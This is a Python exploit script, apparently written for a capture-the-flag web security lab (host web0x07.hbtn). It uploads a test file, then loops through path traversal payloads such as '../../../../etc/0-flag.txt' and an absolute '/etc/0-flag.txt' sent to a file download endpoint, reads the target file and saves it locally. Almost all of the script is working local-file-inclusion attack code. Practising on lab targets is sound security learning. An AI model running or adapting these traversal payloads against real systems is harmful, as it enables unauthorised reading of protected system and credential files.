#!/usr/bin/env python3
"""
Test file upload and then use LFI to read /etc/0-flag.txt
"""

import requests
import os

BASE_URL = "http://web0x07.hbtn/task0"
UPLOAD_URL = f"{BASE_URL}/upload_file"
DOWNLOAD_URL = f"{BASE_URL}/download_file"
LIST_URL = f"{BASE_URL}/list_file"

GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
RESET = '\033[0m'

def test_upload():
    """Upload a test file and see where it goes"""

    # Create a simple test file
    test_content = "This is a test file for LFI exploitation"
    test_filename = "test.txt"

    print(f"{YELLOW}[*] Uploading test file: {test_filename}{RESET}")

    files = {'file': (test_filename, test_content, 'text/plain')}

    try:
        response = requests.post(UPLOAD_URL, files=files)
        print(f"{GREEN}[+] Upload response status: {response.status_code}{RESET}")
        print(f"Response content:\n{response.text}\n")

        # Check if file appears in list
        print(f"{YELLOW}[*] Checking file list...{RESET}")
        list_response = requests.get(LIST_URL)
        if test_filename in list_response.text:
            print(f"{GREEN}[+] File {test_filename} appears in the list!{RESET}\n")
        else:
            print(f"{RED}[-] File not found in list{RESET}\n")

        # Try to download the uploaded file
        print(f"{YELLOW}[*] Trying to download uploaded file...{RESET}")
        download_response = requests.get(DOWNLOAD_URL, params={'filename': test_filename, 'path': '.'})
        print(f"Download status: {download_response.status_code}")
        if download_response.status_code == 200:
            print(f"Content: {download_response.text}\n")

    except Exception as e:
        print(f"{RED}[ERROR] {e}{RESET}")

def exploit_lfi():
    """After uploading, try to use LFI to read /etc/0-flag.txt"""

    print(f"{YELLOW}[*] Attempting LFI exploitation to read /etc/0-flag.txt{RESET}\n")

    # Upload a symlink or use path traversal
    # Try uploading with path traversal in filename
    payloads = [
        # Upload then download with traversal
        ("dummy.txt", "../../../../etc/0-flag.txt"),
        ("dummy.txt", "../../../etc/0-flag.txt"),
        ("dummy.txt", "../../etc/0-flag.txt"),
        ("dummy.txt", "../etc/0-flag.txt"),

        # Try absolute path
        ("dummy.txt", "/etc/0-flag.txt"),
    ]

    # First upload a dummy file
    print(f"{YELLOW}[*] Uploading dummy file...{RESET}")
    files = {'file': ('dummy.txt', 'dummy content', 'text/plain')}
    requests.post(UPLOAD_URL, files=files)

    print(f"{YELLOW}[*] Testing LFI payloads...{RESET}\n")

    for filename, path in payloads:
        try:
            response = requests.get(DOWNLOAD_URL, params={'filename': filename, 'path': path})

            if response.status_code == 200 and len(response.content) > 0:
                content = response.text
                if "dummy content" not in content.lower() and "file hub" not in content.lower():
                    print(f"{GREEN}[SUCCESS!]{RESET}")
                    print(f"Payload: filename={filename}&path={path}")
                    print(f"Content:\n{content}")

                    # Save the flag
                    script_dir = os.path.dirname(os.path.abspath(__file__))
                    flag_file = os.path.join(script_dir, "0-flag.txt")
                    with open(flag_file, 'w') as f:
                        f.write(content)
                    print(f"\n{GREEN}Flag saved to: {flag_file}{RESET}")
                    return True

        except Exception as e:
            pass

    return False

if __name__ == "__main__":
    print(f"{GREEN}{'='*60}{RESET}")
    print(f"{GREEN}File Upload + LFI Exploitation Script{RESET}")
    print(f"{GREEN}{'='*60}{RESET}\n")

    # Step 1: Test upload functionality
    test_upload()

    # Step 2: Try LFI exploitation
    if not exploit_lfi():
        print(f"\n{RED}LFI exploitation failed. The flag might not exist at /etc/0-flag.txt{RESET}")

    print(f"\n{GREEN}Done!{RESET}")
